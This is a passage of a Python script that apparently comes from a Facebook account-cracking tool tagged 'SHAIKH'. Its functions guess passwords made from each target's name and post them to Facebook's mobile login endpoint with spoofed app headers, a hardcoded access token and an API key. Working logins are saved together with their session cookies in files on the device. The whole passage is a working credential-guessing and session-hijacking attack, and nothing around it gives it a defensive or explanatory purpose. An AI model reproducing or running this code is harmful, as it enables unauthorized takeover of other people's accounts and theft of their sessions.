                        data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":ids,"password":pas,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
                        headers = {"Content-Type": "application/x-www-form-accencoded","Host": "graph.facebook.com","User-Agent": u_a(),"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "unknown","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
                        url = 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [SHAIKH-OK] '+ids+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        #print("\r\r\033[1;33m Cookie: "+coki)
                                        open('/sdcard/SHAIKH-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/SHAIKH-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[SHAIKH-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;205m [SHAIKH-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/SHAIKH-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('/sdcard/SHAIKH-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                        else:
                                        continue
                loop+=1
        except requests.exceptions.ConnectionError:
            time.sleep(20)
        except Exception as e:
                pass
def api2(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [SHAIKH-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/417.0.0.33.65;FBPN/com.facebook.katana;FBLC/in_ID;FBBV/480086274;FBCR/Corporation Tbk;FBMF/realme;FBBD/realme;FBDV/RMX3740;FBSV/7.1.2;FBCA/x86:armeabi-v7a;FBDM/{density=1.0,width=540,height=960};FB_FW/1;FBRV/483172840;]"
                        data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":ids,"password":pas,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
                        cn = random.randint(60,99)
                        headers = {"Content-Type": "application/x-www-form-urlencoded","Accept": "*/*","Host": "graph.facebook.com","User-Agent": u_a(),"X-FB-Net-HNI": "25227","X-FB-SIM-HNI": "29752","X-FB-Connection-Type": "MOBILE.LTE","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive","Content-Length":f"6{cn}"}
                        url = 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [SHAIKH-OK] '+ids+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        #print("\r\r\033[1;33m Cookie: "+coki)
                                        open('/sdcard/SHAIKH-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/SHAIKH-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[SHAIKH-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;205m [SHAIKH-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/SHAIKH-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('/sdcard/SHAIKH-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                        else:
                                        continue
                loop+=1
        except requests.exceptions.ConnectionError:
            time.sleep(20)
        except Exception as e:
                pass



try:
	menu()
except requests.exceptions.ConnectionError:
	print('\n No internet connection ...')
	exit()
except:exit()